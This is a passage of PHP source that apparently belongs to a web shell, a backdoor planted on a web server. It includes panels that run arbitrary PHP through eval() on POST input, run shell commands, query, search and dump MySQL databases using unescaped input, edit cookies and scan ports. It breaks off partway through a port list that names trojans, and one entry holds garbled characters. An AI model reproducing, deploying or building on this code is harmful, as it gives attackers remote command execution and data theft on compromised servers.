        foreach ($_POST['ajsql_q'] as $CUR_Q) {
            if (empty($CUR_Q))
                continue;
            $CUR_Q .= ';';
            
            $num = AjMySQL_FetchResult(AjMySQLQ($CUR_Q, true), $FETCHED, false);
            if ($num <= 0)
                continue;
            
            echo "\n\n\n" . '<table border=0 cellspacing=0 cellpadding=0><caption>' . $CUR_Q . '</caption>';
            
            $INDEXES = array_keys($FETCHED[0]);
            echo "\n\t" . '<tr><td class="listing" colspan=' . (count($INDEXES) + 1) . '>&gt;&gt; Fetched: ' . $num . str_repeat('&nbsp;', 10) . 'Affected: ' . mysql_affected_rows() . '</td></tr>';
            echo "\n\t" . '<tr><td class="listing"><div align=center  class="highlight_txt">###</td>';
            foreach ($INDEXES as $key)
                echo '<td class="listing"><div align=center class="highlight_txt">' . $key . '</td>';
            echo '</tr>';
            
            for ($l = 0; $l < count($FETCHED); $l++) {
                echo "\n\t" . '<tr><td class="listing" width=40><div align=right class="highlight_txt">' . $l . '</td>';
                for ($i = 0; $i < count($INDEXES); $i++)
                    echo '<td class="listing"> ' . AjDecorVar($FETCHED[$l][$INDEXES[$i]], true) . '</td>';
            }
            
            echo "\n" . '</table><br>';
        }
        echo "\n" . '</td></tr></table>';
        break;
    
    ########
    ########   SQL Search
    ########
    case 'SQLS':
        if (!isset($_GET['ajsql_s'], $_GET['ajsql_l'], $_GET['ajsql_p'], $_GET['ajsql_d']))
            die(AjError('SQL server/login/password/database are not set'));
        
		$dbh = new mysqli($_GET['ajsql_s'], $_GET['ajsql_l'], $_GET['ajsql_p']);		
		
        if(mysqli_connect_errno()){
			die(AjError('No connection to mysql server!' . "\n" . '<br>MySQL:#' . mysqli_connect_error()));
		} else {
			 echo '&gt;&gt; MySQL connected!';
		}
        
		if (!$dbh->select_db($_GET['ajsql_d'])) {
				die(AjError('Can\'t select database!' . "\n" . '<br>MySQL:#' . $dbh->error));
		}
		
        AjMySQLQ("SET NAMES 'utf8';", false);
		
        echo "\n" . '<table border=0 cellspacing=0 cellpadding=0><tr><td class=h2_oneline><h2>DB:</h2></td>';
        echo "\n" . '<td class=linelisting><font class=highlight_txt>' . ((empty($_GET['ajsql_d'])) ? '&lt;Server&gt;' : $_GET['ajsql_d']) . '</font></td></tr></table>';
        
        echo "\n" . '<form action="' . AjURL('leave', '') . '" method=POST>';
        echo "\n" . '<table border=0 cellspacing=0 cellpadding=0 width=100%>';
        echo "\n" . '<tr><td width=1% class=h2_oneline style="vertical-align:top;">';
        
        AjMySQL_FetchResult(AjMySQLQ('SHOW TABLES;', true), $TABLES, true);
        for ($i = 0; $i < count($TABLES); $i++)
            $TABLES[$i] = $TABLES[$i][0];
        asort($TABLES);
        
        if (isset($_POST['ajsqlsearch']['txt']))
            if (get_magic_quotes_gpc() == 1)
                $_POST['ajsqlsearch']['txt'] = stripslashes($_POST['ajsqlsearch']['txt']);
        
        echo "\n\t" . '<SELECT MULTIPLE name="ajsqlsearch[tables][]" SIZE=30>';
        for ($i = 0; $i < count($TABLES); $i++) {
            AjMySQL_FetchResult(AjMySQLQ('SELECT COUNT(*) FROM `' . $TABLES[$i] . '`;', true), $TRowCnt, true);
            if ($TRowCnt[0][0] > 0)
                echo "\n\t" . '<OPTION value="' . $TABLES[$i] . '" ' . ((isset($_POST['ajsqlsearch']['tables'])) ? ((in_array($TABLES[$i], $_POST['ajsqlsearch']['tables'])) ? 'SELECTED' : '') : 'SELECTED') . '>' . $TABLES[$i] . '</OPTION>';
        }
        echo "\n\t" . '</SELECT>';
        echo "\n" . '</td><td  width=100%>';
        echo "\n" . '<input type=text name="ajsqlsearch[txt]" style="width:100%;" value="' . ((empty($_POST['ajsqlsearch']['txt'])) ? '' : str_replace('"', '&quot;', $_POST['ajsqlsearch']['txt'])) . '">';
        echo "\n" . '<br>';
        foreach (array(
            'Any',
            'Each',
            'Exact',
            'RegExp'
        ) as $cur_rad)
            echo '<input type=radio name="ajsqlsearch[mode]" value="' . strtolower($cur_rad) . '" ' . ((isset($_POST['ajsqlsearch']['mode'])) ? (($_POST['ajsqlsearch']['mode'] == strtolower($cur_rad)) ? 'CHECKED' : '') : (($cur_rad == 'Any') ? 'CHECKED' : '')) . ' class=radio>' . $cur_rad . '&nbsp;&nbsp;&nbsp;';
        echo "\n" . '<div align=right><input type=submit value="Search..." class=submit style="width:100pt;"></div>';
        echo "\n" . '</form>';
        
        if (!isset($_POST['ajsqlsearch']))
            die('</td></tr></table>');
        
        if (empty($_POST['ajsqlsearch']['tables']))
            die(AjError('No tables selected'));
        
        if (in_array($_POST['ajsqlsearch']['mode'], array(
            'any',
            'each'
        )))
            $_POST['ajsqlsearch']['txt'] = explode(' ', mysql_real_escape_string($_POST['ajsqlsearch']['txt']));
        else
            $_POST['ajsqlsearch']['txt'] = array(
                $_POST['ajsqlsearch']['txt']
            );
        
        
        $GLOBALFOUND = 0;
        foreach ($_POST['ajsqlsearch']['tables'] as $CUR_TABLE) {
            $Q     = 'SELECT * FROM `' . $CUR_TABLE . '` WHERE ';
            $Q_ARR = array();
            AjMySQL_FetchResult(AjMySQLQ('SHOW COLUMNS FROM `' . $CUR_TABLE . '`;', true), $COLS, true);
            for ($i = 0; $i < count($COLS); $i++)
                $COLS[$i] = $COLS[$i][0];
            foreach ($COLS as $CUR_COL) {
                if (in_array($_POST['ajsqlsearch']['mode'], array(
                    'any',
                    'each',
                    'exact'
                ))) {
                    for ($i = 0; $i < count($_POST['ajsqlsearch']['txt']); $i++)
                        $Q_ARR[] = $CUR_COL . ' LIKE "%' . ($_POST['ajsqlsearch']['txt'][$i]) . '%"';
                } else
                    $Q_ARR[] = $CUR_COL . ' REGEXP ' . $_POST['ajsqlsearch']['txt'][0];
                
                if ($_POST['ajsqlsearch']['mode'] == 'each') {
                    $Q_ARR_EXACT[] = implode(' AND ', $Q_ARR);
                    $Q_ARR         = array();
                }
            }
            if (in_array($_POST['ajsqlsearch']['mode'], array(
                'any',
                'exact'
            )))
                $Q .= implode(' OR ', $Q_ARR) . ';';
            if ($_POST['ajsqlsearch']['mode'] == 'each')
                $Q .= ' ( ' . implode(' ) OR ( ', $Q_ARR_EXACT) . ' );';
            if ($_POST['ajsqlsearch']['mode'] == 'regexp')
                $Q .= ' ( ' . implode(' ) OR ( ', $Q_ARR) . ' );';
            
           
            
            if (($num = AjMySQL_FetchResult(AjMySQLQ($Q, true), $FETCHED, true)) > 0) {
                $GLOBALFOUND += $num;
                echo "\n\n" . '<table border=0 cellspacing=0 cellpadding=0 align=center><caption>' . $num . ' matched in ' . $CUR_TABLE . ' :</caption>';
                echo "\n\t" . '<tr><td class=listing><font class="highlight_txt">' . implode('</td><td class=listing><font class="highlight_txt">', $COLS) . '</td></tr>';
                for ($l = 0; $l < count($FETCHED); $l++) {
                    echo "\n\t" . '<tr>';
                    for ($i = 0; $i < count($FETCHED[$l]); $i++)
                        echo '<td class="listing"> ' . AjDecorVar($FETCHED[$l][$i], true) . '</td>';
                    echo '</tr>';
                }
                echo "\n" . '</table><br>';
            }
        }
        echo "\n" . '<br>Total: ' . $GLOBALFOUND . ' matches';
        
        echo "\n" . '</td></tr></table>';
        break;
    
    ########
    ########   SQL Dump
    ########
    case 'SQLD':
        if (!isset($_GET['ajsql_s'], $_GET['ajsql_l'], $_GET['ajsql_p'], $_GET['ajsql_d']))
            die(AjError('SQL server/login/password/database are not set'));
        
        $dbh = new mysqli($_GET['ajsql_s'], $_GET['ajsql_l'], $_GET['ajsql_p']);		
		
        if (mysqli_connect_errno()){
			die(AjError('No connection to mysql server!' . "\n" . '<br>MySQL:#' . mysqli_connect_error()));
		} else {
			echo '&gt;&gt; MySQL connected!';
		}
		
		if (!$dbh->select_db($_GET['ajsql_d'])) {
				die(AjError('Can\'t select database!' . "\n" . '<br>MySQL:#' . $dbh->error));
		}	
		
		AjMySQLQ("SET NAMES 'utf8';", false);
        
        echo "\n" . '<table border=0 cellspacing=0 cellpadding=0><tr><td class=h2_oneline><h2>DB:</h2></td>';
        echo "\n" . '<td class=linelisting><font class=highlight_txt>' . ((empty($_GET['ajsql_d'])) ? '&lt;Server&gt;' : $_GET['ajsql_d']) . '</font></td></tr></table>';
        
        echo "\n" . '<form action="' . AjURL('leave', '') . '" method=POST>';
        echo "\n" . '<table border=0 cellspacing=0 cellpadding=0 width=100%>';
        echo "\n" . '<tr><td width=1% class=h2_oneline style="vertical-align:top;">';
        
        AjMySQL_FetchResult(AjMySQLQ('SHOW TABLES;', true), $TABLES, true);
        for ($i = 0; $i < count($TABLES); $i++)
            $TABLES[$i] = $TABLES[$i][0];
        asort($TABLES);
        
        echo "\n\t" . '<SELECT MULTIPLE name="ajsql_tables[]" SIZE=30>';
        for ($i = 0; $i < count($TABLES); $i++) {
            AjMySQL_FetchResult(AjMySQLQ('SELECT COUNT(*) FROM `' . $TABLES[$i] . '`;', true), $TRowCnt, true);
            if ($TRowCnt[0][0] > 0)
                echo "\n\t" . '<OPTION value="' . $TABLES[$i] . '" SELECTED>' . $TABLES[$i] . '</OPTION>';
        }
        echo "\n\t" . '</SELECT>';
        echo "\n" . '</td><td  width=100%>You can set a pre-dump-query(s) (ex: SET NAMES utf8; ):';
        echo "\n" . '<input type=text name="ajsql_q" style="width:100%;">';
        echo "\n" . '<br>';
        echo "\n" . '<div align=right>' . 'GZIP <input type=checkbox name="aj_gzip" value="Yeah, baby">' . str_repeat('&nbsp;', 10) . '<input type=submit value="Dump!" class=submit style="width:100pt;"></div>';
        echo "\n" . '</form>';
        break;
    
    ########
    ########   PHP Console
    ########
    case 'PHP':
        if (isset($_GET['ajval']))
            $_POST['ajval'] = $_GET['ajval'];
        
        echo "\n" . '<table border=0 align=right><tr><td class=h2_oneline>Do</td><td class="linelisting">';
        $PRESETS = array_keys($GLOB['VAR']['PHP']['Presets']);
        for ($i = 0; $i < count($PRESETS); $i++)
            echo "\n\t" . '<a href="' . AjURL('leave', 'ajmode') . '&ajval=ajpreset__' . $PRESETS[$i] . '" class=no>[' . $PRESETS[$i] . ']</a>' . (($i == (count($PRESETS) - 1)) ? '' : str_repeat('&nbsp;', 3));
        echo "\n\n" . '</td></tr></table><br><br>';
        
        if (isset($_POST['ajval']))
            if (strpos($_POST['ajval'], 'ajpreset__') === 0) {
                $_POST['ajval'] = substr($_POST['ajval'], strlen('ajpreset__'));
                if (!isset($GLOB['VAR']['PHP']['Presets'][$_POST['ajval']]))
                    die(AjError('Undeclared preset'));
                $_POST['ajval'] = $GLOB['VAR']['PHP']['Presets'][$_POST['ajval']];
            }
        
        echo "\n" . '<form action="' . AjURL('leave', '') . '" method=POST>';
        echo "\n" . '<textarea name="ajval" rows=15 style="width:100%;">' . ((isset($_POST['ajval'])) ? $_POST['ajval'] : '') . '</textarea>';
        echo "\n" . '<div align=right><input type=submit value="Eval" class="submit" style="width:200pt;"></div>';
        echo "\n" . '</form>';
        if (isset($_POST['ajval'])) {
            echo str_repeat("\n", 10) . '<!--php_eval-->' . "\n\n" . '<table border=0 width=100%><tr><td class=listing>' . "\n\n";
            eval($_POST['ajval']);
            echo str_repeat("\n", 10) . '<!--/php_eval-->' . '</td></tr></table>';
        }
        break;
    
    ########
    ########  Cookies Maintenance
    ########
    
    case 'COOK':
        if ($AJGLOBALVARS)
            AjWarning('Set cookie may fail. This is because "' . basename($_SERVER['PHP_SELF']) . '" has fucked up the output with it\'s shit =(');
        echo 'Found <font class="highlight_txt">' . ($CNT = count($_COOKIE)) . ' cookie' . (($CNT == 1) ? '' : 's');
        
        echo "\n" . '<div align=right><a href="' . AjURL('leave', '') . '">[RELOAD]</a></div>';
        
        echo "\n" . '<form action="' . AjURL('leave', '') . '" method=POST>';
        echo "\n" . '<table border=0 align=center><tr><td class=linelisting><div align=center><font class="highlight_txt">Cookie name</td><td class=linelisting><div align=center><font class="highlight_txt">Value</td></tr>';
        for ($look_len = 1, $maxlen = 0; $look_len >= 0; $look_len--) {
            if ($maxlen > 100)
                $maxlen = 100;
            if ($maxlen < 30)
                $maxlen = 30;
            $maxlen += 3;
            for ($INDEXES = array_keys($_COOKIE), $i = 0; $i < count($INDEXES); $i++) {
                if ($look_len) {
                    if (strlen($_COOKIE[$INDEXES[$i]]) > $maxlen) {
                        $maxlen = strlen($_COOKIE[$INDEXES[$i]]);
                    }
                    continue;
                }
                
                echo "\n" . '<tr><td class=linelisting>' . $INDEXES[$i] . '</td>' . '<td class=linelisting><input type=text ' . 'name="ajparam[' . str_replace(array(
                    '"',
                    "\n",
                    "\r",
                    "\t"
                ), array(
                    '&quot;',
                    ' ',
                    ' ',
                    ' '
                ), $INDEXES[$i]) . ']" ' . 'value="' . str_replace(array(
                    '"',
                    "\n",
                    "\r",
                    "\t"
                ), array(
                    '&quot;',
                    ' ',
                    ' ',
                    ' '
                ), $_COOKIE[$INDEXES[$i]]) . '" ' . 'SIZE=' . $maxlen . '></td>' . '</tr>';
            }
            if (!$look_len) {
                echo "\n" . '<tr><td colspan=2><div align=center>[Set new cookie]</td></tr>';
                echo "\n" . '<tr><td class=linelisting><input type=text name="ajparam[AJS_NEWCOOK][NAM]" value="" style="width:99%;"></td>' . '<td class=linelisting><input type=text name="ajparam[AJS_NEWCOOK][VAL]" value="" SIZE=' . $maxlen . '></td>' . '</tr>';
                echo "\n" . '<tr><td class=linelisting colspan=2 style="text-align:center;">' . '<input type=submit value="Save" class="submit" style="width:50%;">' . '</td></tr>';
            }
        }
        echo "\n" . '</table></form>';
        
        break;
    
    ########
    ########   Command line
    ########
    case 'CMD':
        echo "\n" . '<table border=0 align=right><tr><td class=h2_oneline>Do</td><td>';
        echo "\n" . '<SELECT name="selector" onchange="document.getElementById(\'ajval\').value+=document.getElementById(\'selector\').value+\'\n\'" style="width:200pt;">';
        echo "\n\t" . '<OPTION></OPTION>';
        $PRESETS = array_keys($GLOB['VAR']['CMD']['Presets']);
        for ($i = 0; $i < count($PRESETS); $i++)
            echo "\n\t" . '<OPTION value="' . str_replace('"', '&quot;', $GLOB['VAR']['CMD']['Presets'][$PRESETS[$i]]) . '">' . $PRESETS[$i] . '</OPTION>';
        echo "\n\n" . '</SELECT></td></tr></table><br><br>';
        
        if (isset($_POST['ajval']))
            if (strpos($_POST['ajval'], 'ajpreset__') === 0) {
                $_POST['ajval'] = substr($_POST['ajval'], strlen('ajpreset__'));
                if (!isset($GLOB['VAR']['CMD']['Presets'][$_POST['ajval']]))
                    die(AjError('Undeclared preset'));
                $_POST['ajval'] = $GLOB['VAR']['CMD']['Presets'][$_POST['ajval']];
            }
        
        $warnstr = AjExecNahuj('', $trash1, $trash2);
        if (!$warnstr[1])
            AjWarning($warnstr[2]);
        
        echo "\n" . '<form action="' . AjURL('leave', '') . '" method=POST>';
        echo "\n" . '<textarea name="ajval" rows=5 style="width:100%;">' . ((isset($_POST['ajval'])) ? $_POST['ajval'] : '') . '</textarea>';
        echo "\n" . '<div align=right>' . '<input type=submit value="Exec" class="submit" style="width:100pt;"> ' . '</div>';
        echo "\n" . '</form>';
        if (isset($_POST['ajval'])) {
			
            //$_POST['ajval'] = split("\n", str_replace("\r", '', $_POST['ajval']));			
			$_POST['ajval'] = explode("\n", trim(str_replace("\r", '', $_POST['ajval']), "\n"));
			
			
            for ($i = 0; $i < count($_POST['ajval']); $i++) {
                $CUR = $_POST['ajval'][$i];
                if (empty($CUR))
                    continue;
                
                AjExecNahuj($CUR, $OUT, $RET);
                echo str_repeat("\n", 10) . '<!--' . $warnstr[2] . '("' . $CUR . '")-->' . "\n\n" . '<table border=0 width=100%><tr><td class=listing>' . "\n\n";
                
                echo '<span style="position:absolute;left:10%;" class="highlight_txt">Return</span>';
                echo '<span style="position:absolute;right:30%;" class="highlight_txt">Output</span>';
                echo '<br><nobr>';
                echo "\n" . '<textarea rows=10 style="width:20%;display:inline;">' . $CUR . "\n\n" . ((is_array($RET)) ? implode("\n", $RET) : $RET) . '</textarea>';
                echo "\n" . '<textarea rows=10 style="width:79%;display:inline;">' . "\n" . ((is_array($OUT)) ? implode("\n", $OUT) : $OUT) . '</textarea>';
                echo '</nobr>';
                echo str_repeat("\n", 10) . '<!--/' . $warnstr[2] . '("' . $CUR . '")-->' . "\n\n" . '</td></tr></table>';
            }
        }
        break;
    
    ########
    ########   String functions
    ########
    case 'STR':
        if (isset($_POST['ajval'], $_POST['ajparam'])) {
            $crypted = '';
            if ($_POST['ajparam'] == 'md5')
                $crypted .= md5($_POST['ajval']);
            if ($_POST['ajparam'] == 'sha1')
                $crypted .= sha1($_POST['ajval']);
            if ($_POST['ajparam'] == 'crc32')
                $crypted .= crc32($_POST['ajval']);
            if ($_POST['ajparam'] == '2base')
                $crypted .= base64_encode($_POST['ajval']);
            if ($_POST['ajparam'] == 'base2')
                $crypted .= base64_decode($_POST['ajval']);
            if ($_POST['ajparam'] == '2HEX')
                for ($i = 0; $i < strlen($_POST['ajval']); $i++)
                    $crypted .= strtoupper(dechex(ord($_POST['ajval'][$i]))) . ' ';
            if ($_POST['ajparam'] == 'HEX2') {
                $_POST['ajval'] = str_replace(' ', '', $_POST['ajval']);
                for ($i = 0; $i < strlen($_POST['ajval']); $i += 2)
                    $crypted .= chr(hexdec($_POST['ajval'][$i] . $_POST['ajval'][$i + 1]));
            }
            if ($_POST['ajparam'] == '2DEC') {
                $crypted = 'CHAR(';
                for ($i = 0; $i < strlen($_POST['ajval']); $i++)
                    $crypted .= ord($_POST['ajval'][$i]) . (($i < (strlen($_POST['ajval']) - 1)) ? ',' : ')');
            }
            if ($_POST['ajparam'] == '2URL')
                $crypted .= urlencode($_POST['ajval']);
            if ($_POST['ajparam'] == 'URL2')
                $crypted .= urldecode($_POST['ajval']);
        }
        if (isset($crypted))
            echo $_POST['ajparam'] . '(<font class="highlight_txt"> ' . $_POST['ajval'] . ' </font>) = ';
        echo "\n" . '<form action="' . AjURL('leave', '') . '" method=POST>';
        echo "\n" . '<textarea name="ajval" rows=20 style="width:100%;">' . ((isset($crypted)) ? $crypted : '') . '</textarea>';
        echo "\n" . '<div align=right>' . '<input type=submit name="ajparam" value="md5" class="submit" style="width:50pt;"> ' . '<input type=submit name="ajparam" value="sha1" class="submit" style="width:50pt;"> ' . '<input type=submit name="ajparam" value="crc32" class="submit" style="width:50pt;"> ' . str_repeat('&nbsp;', 5) . '<input type=submit name="ajparam" value="2base" class="submit" style="width:50pt;"> ' . '<input type=submit name="ajparam" value="base2" class="submit" style="width:50pt;"> ' . '<input type=submit name="ajparam" value="2HEX" class="submit" style="width:50pt;"> ' . '<input type=submit name="ajparam" value="HEX2" class="submit" style="width:50pt;"> ' . '<input type=submit name="ajparam" value="2DEC" class="submit" style="width:50pt;"> ' . '<input type=submit name="ajparam" value="2URL" class="submit" style="width:50pt;"> ' . '<input type=submit name="ajparam" value="URL2" class="submit" style="width:50pt;"> ' . '</div>';
        echo "\n" . '</form>';
        
        break;
    
    ########
    ########   Port scaner
    ########
    case 'PRT':
        echo '[!] For complete portlist go to <a href="http://www.iana.org/assignments/port-numbers" target=_blank>http://www.iana.org/assignments/port-numbers</a>';
        
        if (isset($_POST['ajportscan']) or isset($_GET['ajparam']))
            $DEF_PORTS = array(
                1 => 'tcpmux (TCP Port Service Multiplexer)',
                2 => 'Management Utility',
                3 => 'Compression Process',
                5 => 'rje (Remote Job Entry)',
                7 => 'echo',
                9 => 'discard',
                11 => 'systat',
                13 => 'daytime',
                15 => 'netstat',
                17 => 'quote of the day',
                18 => 'send/rwp',
                19 => 'character generator',
                20 => 'ftp-data',
                21 => 'ftp',
                22 => 'ssh, pcAnywhere',
                23 => 'Telnet',
                25 => 'SMTP (Simple Mail Transfer)',
                27 => 'ETRN (NSW User System FE)',
                29 => 'MSG ICP',
                31 => 'MSG Authentication',
                33 => 'dsp (Display Support Protocol)',
                37 => 'time',
                38 => 'RAP (Route Access Protocol)',
                39 => 'rlp (Resource Location Protocol)',
                41 => 'Graphics',
                42 => 'nameserv, WINS',
                43 => 'whois, nickname',
                44 => 'MPM FLAGS Protocol',
                45 => 'Message Processing Module [recv]',
                46 => 'MPM [default send]',
                47 => 'NI FTP',
                48 => 'Digital Audit Daemon',
                49 => 'TACACS, Login Host Protocol',
                50 => 'RMCP, re-mail-ck',
                53 => 'DNS',
                57 => 'MTP (any private terminal access)',
                59 => 'NFILE',
                60 => 'Unassigned',
                61 => 'NI MAIL',
                62 => 'ACA Services',
                63 => 'whois++',
                64 => 'Communications Integrator (CI)',
                65 => 'TACACS-Database Service',
                66 => 'Oracle SQL*NET',
                67 => 'bootps (Bootstrap Protocol Server)',
                68 => 'bootpd/dhcp (Bootstrap Protocol Client)',
                69 => 'Trivial File Transfer Protocol (tftp)',
                70 => 'Gopher',
                71 => 'Remote Job Service',
                72 => 'Remote Job Service',
                73 => 'Remote Job Service',
                74 => 'Remote Job Service',
                75 => 'any private dial out service',
                76 => 'Distributed External Object Store',
                77 => 'any private RJE service',
                78 => 'vettcp',
                79 => 'finger',
                80 => 'World Wide Web HTTP',
                81 => 'HOSTS2 Name Serve',
                82 => 'XFER Utility',
                83 => 'MIT ML Device',
                84 => 'Common Trace Facility',
                85 => 'MIT ML Device',
                86 => 'Micro Focus Cobol',
                87 => 'any private terminal link',
                88 => 'Kerberos, WWW',
                89 => 'SU/MIT Telnet Gateway',
                90 => 'DNSIX Securit Attribute Token Map',
                91 => 'MIT Dover Spooler',
                92 => 'Network Printing Protocol',
                93 => 'Device Control Protocol',
                94 => 'Tivoli Object Dispatcher',
                95 => 'supdup',
                96 => 'DIXIE',
                98 => 'linuxconf',
                99 => 'Metagram Relay',
                100 => '[unauthorized use]',
                101 => 'HOSTNAME',
                102 => 'ISO, X.400, ITOT',
                103 => 'Genesis Point-to&#14144;&#429;oi&#65535;&#65535; T&#0;&#0;ns&#0;&#0;et',
                104 => 'ACR-NEMA Digital Imag. & Comm. 300',
                105 => 'CCSO name server protocol',
                106 => 'poppassd',
                107 => 'Remote Telnet Service',
                108 => 'SNA Gateway Access Server',
                109 => 'POP2',
                110 => 'POP3',
                111 => 'Sun RPC Portmapper',
                112 => 'McIDAS Data Transmission Protocol',
                113 => 'Authentication Service',
                115 => 'sftp (Simple File Transfer Protocol)',
                116 => 'ANSA REX Notify',
                117 => 'UUCP Path Service',
                118 => 'SQL Services',
                119 => 'NNTP',
                120 => 'CFDP',
                123 => 'NTP',
                124 => 'SecureID',
                129 => 'PWDGEN',
                133 => 'statsrv',
                135 => 'loc-srv/epmap',
                137 => 'netbios-ns',
                138 => 'netbios-dgm (UDP)',
                139 => 'NetBIOS',
                143 => 'IMAP',
                144 => 'NewS',
                150 => 'SQL-NET',
                152 => 'BFTP',
                153 => 'SGMP',
                156 => 'SQL Service',
                161 => 'SNMP',
                175 => 'vmnet',
                177 => 'XDMCP',
                178 => 'NextStep Window Server',
                179 => 'BGP',
                180 => 'SLmail admin',
                199 => 'smux',
                210 => 'Z39.50',
                213 => 'IPX',
                218 => 'MPP',
                220 => 'IMAP3',
                256 => 'RAP',
                257 => 'Secure Electronic Transaction',
                258 => 'Yak Winsock Personal Chat',
                259 => 'ESRO',
                264 => 'FW1_topo',
                311 => 'Apple WebAdmin',
                350 => 'MATIP type A',
                351 => 'MATIP type B',
                363 => 'RSVP tunnel',
                366 => 'ODMR (On-Demand Mail Relay)',
                371 => 'Clearcase',
                387 => 'AURP (AppleTalk Update-Based Routing Protocol)',
                389 => 'LDAP',
                407 => 'Timbuktu',
                427 => 'Server Location',
                434 => 'Mobile IP',
                443 => 'ssl',
                444 => 'snpp, Simple Network Paging Protocol',
                445 => 'SMB',
                458 => 'QuickTime TV/Conferencing',
                468 => 'Photuris',
                475 => 'tcpnethaspsrv',
                500 => 'ISAKMP, pluto',
                511 => 'mynet-as',
                512 => 'biff, rexec',
                513 => 'who, rlogin',
                514 => 'syslog, rsh',
                515 => 'lp, lpr, line printer',
                517 => 'talk',
                520 => 'RIP (Routing Information Protocol)',
                521 => 'RIPng',
                522 => 'ULS',
                531 => 'IRC',
                543 => 'KLogin, AppleShare over IP',
                545 => 'QuickTime',
                548 => 'AFP',
                554 => 'Real Time Streaming Protocol',
                555 => 'phAse Zero',
                563 => 'NNTP over SSL',
                575 => 'VEMMI',
                581 => 'Bundle Discovery Protocol',
                593 => 'MS-RPC',
                608 => 'SIFT/UFT',
                626 => 'Apple ASIA',
                631 => 'IPP (Internet Printing Protocol)',
                635 => 'RLZ DBase',
                636 => 'sldap',
                642 => 'EMSD',
                648 => 'RRP (NSI Registry Registrar Protocol)',
                655 => 'tinc',
                660 => 'Apple MacOS Server Admin',
                666 => 'Doom',
                674 => 'ACAP',
                687 => 'AppleShare IP Registry',
                700 => 'buddyphone',
                705 => 'AgentX for SNMP',
                901 => 'swat, realsecure',
                993 => 's-imap',
                995 => 's-pop',
                1024 => 'Reserved',
                1025 => 'network blackjack',
                1062 => 'Veracity',
                1080 => 'SOCKS',
                1085 => 'WebObjects',
                1227 => 'DNS2Go',
                1243 => 'SubSeven',
                1338 => 'Millennium Worm',
                1352 => 'Lotus Notes',
                1381 => 'Apple Network License Manager',
                1417 => 'Timbuktu Service 1 Port',
                1418 => 'Timbuktu Service 2 Port',
                1419 => 'Timbuktu Service 3 Port',
                1420 => 'Timbuktu Service 4 Port',
                1433 => 'Microsoft SQL Server',
                1434 => 'Microsoft SQL Monitor',
                1477 => 'ms-sna-server',
                1478 => 'ms-sna-base',
                1490 => 'insitu-conf',
                1494 => 'Citrix ICA Protocol',
                1498 => 'Watcom-SQL',
                1500 => 'VLSI License Manager',
                1503 => 'T.120',
                1521 => 'Oracle SQL',
                1522 => 'Ricardo North America License Manager',
                1524 => 'ingres',
                1525 => 'prospero',
                1526 => 'prospero',
                1527 => 'tlisrv',
                1529 => 'oracle',
                1547 => 'laplink',
                1604 => 'Citrix ICA, MS Terminal Server',
                1645 => 'RADIUS Authentication',
                1646 => 'RADIUS Accounting',
                1680 => 'Carbon Copy',
                1701 => 'L2TP/LSF',
                1717 => 'Convoy',
                1720 => 'H.323/Q.931',
                1723 => 'PPTP control port',
                1731 => 'MSICCP',
                1755 => 'Windows Media .asf',
                1758 => 'TFTP multicast',
                1761 => 'cft-0',
                1762 => 'cft-1',
                1763 => 'cft-2',
                1764 => 'cft-3',
                1765 => 'cft-4',
                1766 => 'cft-5',
                1767 => 'cft-6',
                1808 => 'Oracle-VP2',
                1812 => 'RADIUS server',
                1813 => 'RADIUS accounting',
                1818 => 'ETFTP',
                1973 => 'DLSw DCAP/DRAP',
                1985 => 'HSRP',
                1999 => 'Cisco AUTH',
                2001 => 'glimpse',
                2049 => 'NFS',
                2064 => 'distributed.net',
                2065 => 'DLSw',
                2066 => 'DLSw',
                2106 => 'MZAP',
                2140 => 'DeepThroat',
                2301 => 'Compaq Insight Management Web Agents',
                2327 => 'Netscape Conference',
                2336 => 'Apple UG Control',
                2427 => 'MGCP gateway',
                2504 => 'WLBS',
                2535 => 'MADCAP',
                2543 => 'sip',
                2592 => 'netrek',
                2727 => 'MGCP call agent',
                2628 => 'DICT',
                2998 => 'ISS Real Secure Console Service Port',
                3000 => 'Firstclass',
                3001 => 'Redwood Broker',
                3031 => 'Apple AgentVU',
                3128 => 'squid',
                3130 => 'ICP',
                3150 => 'DeepThroat',
                3264 => 'ccmail',
                3283 => 'Apple NetAssitant',
                3288 => 'COPS',
                3305 => 'ODETTE',
                3306 => 'mySQL',
                3389 => 'RDP Protocol (Terminal Server)',
                3521 => 'netrek',
                4000 => 'icq, command-n-conquer and shell nfm',
                4321 => 'rwhois',
                4333 => 'mSQL',
                4444 => 'KRB524',
                4827 => 'HTCP',
                5002 => 'radio free ethernet',
                5004 => 'RTP',
                5005 => 'RTP',
                5010 => 'Yahoo! Messenger',
                5050 => 'multimedia conference control tool',
                5060 => 'SIP',
                5150 => 'Ascend Tunnel Management Protocol',
                5190 => 'AIM',
                5500 => 'securid',
                5501 => 'securidprop',
                5423 => 'Apple VirtualUser',
                5555 => 'Personal Agent',
                5631 => 'PCAnywhere data',
                5632 => 'PCAnywhere',
                5678 => 'Remote Replication Agent Connection',
                5800 => 'VNC',
                5801 => 'VNC',
                5900 => 'VNC',
                5901 => 'VNC',
                6000 => 'X Windows',
                6112 => 'BattleNet',
                6502 => 'Netscape Conference',
                6667 => 'IRC',
                6670 => 'VocalTec Internet Phone, DeepThroat',
                6699 => 'napster',
                6776 => 'Sub7',
                6970 => 'RTP',
                7007 => 'MSBD, Windows Media encoder',
                7070 => 'RealServer/QuickTime',
                7777 => 'cbt',
                7778 => 'Unreal',
                7648 => 'CU-SeeMe',
                7649 => 'CU-SeeMe',
                8000 => 'iRDMI/Shoutcast Server',
                8010 => 'WinGate 2.1',
                8080 => 'HTTP',
                8181 => 'HTTP',
                8383 => 'IMail WWW',
                8875 => 'napster',
                8888 => 'napster',
                8889 => 'Desktop Data TCP 1',
                8890 => 'Desktop Data TCP 2',
                8891 => 'Desktop Data TCP 3: NESS application',
                8892 => 'Desktop Data TCP 4: FARM product',
                8893 => 'Desktop Data TCP 5: NewsEDGE/Web application',
                8894 => 'Desktop Data TCP 6: COAL application',
                9000 => 'CSlistener',
                10008 => 'cheese worm',
                11371 => 'PGP 5 Keyserver',
                13223 => 'PowWow',
                13224 => 'PowWow',
                14237 => 'Palm',
                14238 => 'Palm',
                18888 => 'LiquidAudio',
                21157 => 'Activision',
                22555 => 'Vocaltec Web Conference',
                23213 => 'PowWow',
                23214 => 'PowWow',
                23456 => 'EvilFTP',
                26000 => 'Quake',
                27001 => 'QuakeWorld',
                27010 => 'Half-Life',
                27015 => 'Half-Life',
                27960 => 'QuakeIII',
                30029 => 'AOL Admin',
                31337 => 'Back Orifice',
                32777 => 'rpc.walld',
                45000 => 'Cisco NetRanger postofficed',
                32773 => 'rpc bserverd',
